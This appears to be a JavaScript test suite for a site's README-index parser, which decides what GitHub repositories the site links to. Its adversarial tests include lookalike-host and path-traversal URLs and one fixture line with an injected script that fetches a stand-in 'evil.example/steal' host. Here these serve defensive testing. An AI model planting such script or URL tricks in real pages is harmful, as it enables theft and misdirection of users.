// tests/portfolio/readme-index.test.mjs
//
// The README indexes are the authorised inclusion rule, which makes the parser a trust boundary: it
// decides what this site links to. These checks are about that boundary and about degradation.
//
// The fixture mirrors the live index shape (the headings and link style actually used by
// velcrafting/velcrafting and Vel-Labs/.github), and the adversarial cases are the ones that matter:
// a wrong owner, a lookalike host, path traversal, an embedded tag, and a missing section.

import { strict as assert } from "node:assert";

import { createModuleLoader } from "../editor/_module-loader.mjs";

const loader = createModuleLoader();
const { extractReadmeIndex, parseRepoUrl, PERSONAL_README, ORG_README, APPROVED_OWNERS } = loader.load(
  "src/lib/github/readme-index.ts",
);

let passed = 0;
const failures = [];

function test(name, fn) {
  try {
    fn();
    passed += 1;
    console.log(`  ok    ${name}`);
  } catch (error) {
    failures.push(name);
    console.log(`  FAIL  ${name}\n        ${error.message}`);
  }
}

/**
 * Structural comparison.
 *
 * Values produced inside the harness's VM carry a different Array prototype, so `deepEqual` rejects
 * contents that are in fact identical. Comparing canonical JSON is the same assertion without the
 * realm assumption — it is not a weaker check.
 */
function sameJson(actual, expected, message) {
  assert.equal(JSON.stringify(actual), JSON.stringify(expected), message);
}

/** Shaped like the live personal index: an allowed section, and sections that are NOT an index. */
const PERSONAL = [
  "# Steven / velcrafting",
  "",
  "## Current Focus",
  "",
  "| Project | What |",
  "| --- | --- |",
  "| [VelDesk](https://github.com/Vel-Labs/VelDesk) | desktop agent |",
  "| [vel-mcp](https://github.com/Vel-Labs/vel-mcp) | MCP tooling |",
  "",
  "## Start Here",
  "",
  "- [civulacrum](https://github.com/Vel-Labs/civulacrum)",
  "",
  "## Elsewhere",
  "",
  "- [Something private](https://github.com/Vel-Labs/not-in-the-index)",
  "",
  "## Profile Bio",
  "",
  "- [A bio link](https://github.com/Vel-Labs/also-not-in-the-index)",
  "",
].join("\n");

const ORG = [
  "# Vel-Labs",
  "",
  "## What We Build",
  "",
  "- [CareSight](https://github.com/Vel-Labs/CareSight)",
  "",
  "## Start Here",
  "",
  "- [project-scaffold](https://github.com/Vel-Labs/project-scaffold)",
  "",
  "## Recommended Pins",
  "",
  "- [thc-leaderboard](https://github.com/Vel-Labs/thc-leaderboard)",
  "- [thc-methodology](https://github.com/Vel-Labs/thc-methodology)",
  "",
].join("\n");

console.log("\nreadme index: authorised inclusion and order");

test("only the allowed sections are read, per source", () => {
  const personal = extractReadmeIndex(PERSONAL, PERSONAL_README);
  const repos = personal.entries.map((entry) => entry.repo).sort();
  sameJson(repos, ["VelDesk", "civulacrum", "vel-mcp"]);
  assert.ok(
    !repos.includes("not-in-the-index") && !repos.includes("also-not-in-the-index"),
    "Elsewhere and Profile Bio are not an index and must never be read",
  );
  assert.ok(personal.found.includes("Current Focus") && personal.found.includes("Start Here"));
});

test("the org source reads its own sections, including Recommended Pins", () => {
  const org = extractReadmeIndex(ORG, ORG_README);
  sameJson(
    org.entries.map((entry) => entry.repo),
    ["CareSight", "project-scaffold", "thc-leaderboard", "thc-methodology"],
    "order comes from the README, not from this code",
  );
});

test("a section that belongs to another source is not read", () => {
  // "Start Here" is allowed for BOTH sources by the contract, so it is read either way. What must not
  // happen is the personal source reading an ORG-ONLY section: "Recommended Pins" is org-only, and the
  // pins in it must not appear just because the personal source was given the file.
  const personal = extractReadmeIndex(ORG, PERSONAL_README);
  const repos = personal.entries.map((entry) => entry.repo);
  assert.ok(repos.includes("project-scaffold"), "Start Here is shared and is read");
  assert.ok(
    !repos.includes("thc-leaderboard") && !repos.includes("thc-methodology"),
    "an org-only section must not be read into the personal index",
  );
  sameJson(personal.missing, ["Current Focus"]);
});

test("duplicates are removed and first-seen order is preserved", () => {
  const text = [
    "## Current Focus",
    "- [VelDesk](https://github.com/Vel-Labs/VelDesk)",
    "- [veldesk again](https://github.com/vel-labs/veldesk)",
    "- [vel-mcp](https://github.com/Vel-Labs/vel-mcp)",
  ].join("\n");
  const result = extractReadmeIndex(text, PERSONAL_README);
  sameJson(result.entries.map((entry) => entry.label), ["VelDesk", "vel-mcp"]);
});

test("the label is shown as authored, and the URL is rebuilt canonically", () => {
  const text = ["## Start Here", "- [Their own wording](https://github.com/Vel-Labs/vel-mcp/tree/main/)"].join("\n");
  const [entry] = extractReadmeIndex(text, ORG_README).entries;
  assert.equal(entry.label, "Their own wording", "README prose is never rewritten");
  assert.equal(entry.url, "https://github.com/Vel-Labs/vel-mcp");
});

console.log("\nreadme index: it is untrusted data");

test("a link to another owner is dropped, not published", () => {
  const text = [
    "## Start Here",
    "- [Not ours](https://github.com/evil-org/evil-repo)",
    "- [Ours](https://github.com/Vel-Labs/vel-mcp)",
  ].join("\n");
  const result = extractReadmeIndex(text, ORG_README);
  sameJson(result.entries.map((entry) => entry.repo), ["vel-mcp"]);
  sameJson([...APPROVED_OWNERS], ["velcrafting", "Vel-Labs"]);
});

test("a lookalike host is refused", () => {
  assert.equal(parseRepoUrl("https://github.com.evil.example/Vel-Labs/vel-mcp"), null);
  assert.equal(parseRepoUrl("https://notgithub.com/Vel-Labs/vel-mcp"), null);
  assert.equal(parseRepoUrl("https://raw.githubusercontent.com/Vel-Labs/vel-mcp/main/x"), null);
});

test("path traversal cannot reach a different owner", () => {
  // The URL parser normalises the traversal, leaving owner `evil` — which is then refused.
  const parsed = parseRepoUrl("https://github.com/Vel-Labs/../../evil/x");
  assert.equal(parsed.owner, "evil");
  const result = extractReadmeIndex(["## Start Here", "- [t](https://github.com/Vel-Labs/../../evil/x)"].join("\n"), ORG_README);
  sameJson(result.entries, []);
});

test("embedded markup is never an entry and never executed", () => {
  const text = [
    "## Start Here",
    "- <script>fetch('https://evil.example/steal')</script>",
    "- ![img](https://github.com/Vel-Labs/vel-mcp)",
  ].join("\n");
  const result = extractReadmeIndex(text, ORG_README);
  // The image syntax still carries a markdown link target; what matters is that the tag itself
  // produced nothing and no code was evaluated.
  assert.ok(result.entries.every((entry) => entry.owner === "Vel-Labs"));
  assert.ok(
    !JSON.stringify(result).includes("evil.example/steal"),
    "no embedded content may reach the extracted result",
  );
});

test("a .git suffix and surrounding punctuation are cleaned", () => {
  sameJson(parseRepoUrl("https://github.com/Vel-Labs/vel-mcp.git"), { owner: "Vel-Labs", repo: "vel-mcp" });
  sameJson(parseRepoUrl("(https://github.com/Vel-Labs/vel-mcp)"), { owner: "Vel-Labs", repo: "vel-mcp" });
});

console.log("\nreadme index: degradation is visible, never silent and never synthetic");

test("a missing section is reported, and no entries are invented", () => {
  const result = extractReadmeIndex("# Nothing here", PERSONAL_README);
  sameJson(result.entries, []);
  sameJson(result.found, []);
  sameJson(result.missing.sort(), ["Current Focus", "Start Here"]);
});

test("unparseable input yields an empty result rather than a throw", () => {
  for (const input of [null, undefined, 42, {}, []]) {
    const result = extractReadmeIndex(input, ORG_README);
    sameJson(result.entries, [], `input ${JSON.stringify(input)} must degrade, not throw`);
    assert.equal(result.missing.length, 3);
  }
});

test("a section with no links is found but contributes nothing", () => {
  const result = extractReadmeIndex("## Start Here\n\nNothing yet.\n", ORG_README);
  sameJson(result.entries, []);
  sameJson(result.found, ["Start Here"]);
  sameJson(result.missing.sort(), ["Recommended Pins", "What We Build"]);
});

test("the committed fallback is populated and inside the approved owners", async () => {
  const { FALLBACK_ENTRIES, FALLBACK_READ_AT } = loader.load("src/lib/github/fallback.ts");
  assert.ok(FALLBACK_ENTRIES.length >= 10, "the cold-start fallback must not be empty");
  assert.match(FALLBACK_READ_AT, /^\d{4}-\d{2}-\d{2}$/, "the fallback records when it was read");
  for (const entry of FALLBACK_ENTRIES) {
    assert.ok(
      APPROVED_OWNERS.some((owner) => owner.toLowerCase() === entry.owner.toLowerCase()),
      `${entry.owner}/${entry.repo} is outside the approved owners`,
    );
    assert.equal(entry.url, `https://github.com/${entry.owner}/${entry.repo}`);
  }
});

console.log(
  `\nreadme index: ${passed}/${passed + failures.length} passed` +
    (failures.length ? `\n  failing: ${failures.join(", ")}` : ""),
);
if (failures.length) process.exitCode = 1;
